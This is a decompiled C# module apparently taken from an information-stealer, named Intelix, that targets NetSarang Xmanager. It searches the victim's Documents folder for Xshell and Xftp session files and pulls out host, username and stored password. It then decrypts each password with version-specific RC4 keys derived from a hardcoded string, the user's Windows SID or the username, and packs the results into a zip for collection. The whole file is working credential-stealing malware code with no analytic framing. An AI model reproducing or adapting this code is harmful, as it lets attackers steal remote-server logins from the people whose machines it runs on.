using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000056 RID: 86
	public class Xmanager : ITarget
	{
		// Token: 0x06000113 RID: 275 RVA: 0x00010214 File Offset: 0x0000E414
		public void Collect(InMemoryZip zip, Counter counter)
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			string sid = current.User.ToString();
			DirectoryInfo root = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
			List<string> source = this.Search(root);
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Xmanager";
			Parallel.ForEach<string>(source, delegate(string sessionFile)
			{
				List<string> list = this.ReadConfigFile(sessionFile);
				bool flag2 = list.Count >= 4;
				if (flag2)
				{
					string text2 = list[0];
					string text3 = ((text2 != null) ? text2.Trim() : null) ?? "";
					string str = list[1] ?? "";
					string text4 = list[2] ?? "";
					string text5 = list[3] ?? "";
					string text6 = "  Version : " + text3 + "\n";
					text6 = text6 + "  Host    : " + str + "\n";
					text6 = text6 + "  User    : " + text4 + "\n";
					text6 = text6 + "  RawPass : " + text5 + "\n";
					string str2 = this.DecryptToString(text4, sid, text5, text3);
					text6 = text6 + "  Decrypted: " + str2 + "\n\n";
					lines.Add(text6);
					counterApplications.Files.Add(sessionFile + " => Xmanager\\sessions.txt");
				}
			});
			bool flag = lines.Any<string>();
			if (flag)
			{
				string text = "Xmanager\\sessions.txt";
				zip.AddTextFile(text, string.Concat(lines));
				counterApplications.Files.Add(text);
				counter.Applications.Add(counterApplications);
			}
		}

		// Token: 0x06000114 RID: 276 RVA: 0x000102E8 File Offset: 0x0000E4E8
		private List<string> Search(DirectoryInfo root)
		{
			List<string> list = new List<string>();
			bool flag = !root.Exists;
			List<string> result;
			if (flag)
			{
				result = list;
			}
			else
			{
				Stack<DirectoryInfo> stack = new Stack<DirectoryInfo>();
				stack.Push(root);
				while (stack.Count > 0)
				{
					DirectoryInfo directoryInfo = stack.Pop();
					try
					{
						FileInfo[] files = directoryInfo.GetFiles();
						for (int i = 0; i < files.Length; i++)
						{
							string fullName = files[i].FullName;
							bool flag2 = fullName.EndsWith(".xsh", StringComparison.OrdinalIgnoreCase) || fullName.EndsWith(".xfp", StringComparison.OrdinalIgnoreCase);
							if (flag2)
							{
								list.Add(fullName);
							}
						}
						DirectoryInfo[] directories = directoryInfo.GetDirectories();
						foreach (DirectoryInfo item in directories)
						{
							stack.Push(item);
						}
					}
					catch
					{
					}
				}
				result = list;
			}
			return result;
		}

		// Token: 0x06000115 RID: 277 RVA: 0x000103F4 File Offset: 0x0000E5F4
		private List<string> ReadConfigFile(string path)
		{
			string input = File.ReadAllText(path);
			string value = Regex.Match(input, "Version=(.*)", RegexOptions.Multiline).Groups[1].Value;
			string value2 = Regex.Match(input, "Host=(.*)", RegexOptions.Multiline).Groups[1].Value;
			string value3 = Regex.Match(input, "UserName=(.*)", RegexOptions.Multiline).Groups[1].Value;
			string value4 = Regex.Match(input, "Password=(.*)", RegexOptions.Multiline).Groups[1].Value;
			List<string> list = new List<string>
			{
				value,
				value2,
				value3
			};
			bool flag = !string.IsNullOrEmpty(value4) && value4.Length > 3;
			if (flag)
			{
				list.Add(value4);
			}
			return list;
		}

		// Token: 0x06000116 RID: 278 RVA: 0x000104D0 File Offset: 0x0000E6D0
		private string DecryptToString(string username, string sid, string rawPass, string ver)
		{
			byte[] array = Convert.FromBase64String(rawPass);
			bool flag = ver.StartsWith("5.0") || ver.StartsWith("4") || ver.StartsWith("3") || ver.StartsWith("2");
			byte[] key;
			if (flag)
			{
				key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes("!X@s#h$e%l^l&"));
			}
			else
			{
				bool flag2 = ver.StartsWith("5.1") || ver.StartsWith("5.2");
				if (flag2)
				{
					key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(sid));
				}
				else
				{
					bool flag3 = ver.StartsWith("5") || ver.StartsWith("6") || ver.StartsWith("7.0");
					if (flag3)
					{
						key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(username + sid));
					}
					else
					{
						string s = new string((new string(username.ToCharArray().Reverse<char>().ToArray<char>()) + sid).ToCharArray().Reverse<char>().ToArray<char>());
						key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(s));
					}
				}
			}
			byte[] array2 = new byte[array.Length - 32];
			Array.Copy(array, 0, array2, 0, array2.Length);
			byte[] array3 = RC4Crypt.Decrypt(key, array2);
			bool flag4 = array3 == null;
			string result;
			if (flag4)
			{
				result = string.Empty;
			}
			else
			{
				result = Encoding.ASCII.GetString(array3);
			}
			return result;
		}
	}
}
